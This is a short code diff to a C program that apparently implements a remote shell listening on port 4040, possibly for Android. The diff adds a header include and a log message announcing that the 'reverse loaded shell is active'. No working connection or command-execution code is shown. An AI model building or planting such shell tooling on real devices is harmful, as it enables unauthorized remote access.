@@ -6,10 +6,13 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 
+#include "shared.h"
+
 #define PORT 4040
 
 int main()
 {
+	LOGV("[+] reverse loaded shell is active! -- turn off Mobile Hot Spot again");
 	int newfd, sockfd;
 	struct sockaddr_in saddr;
 
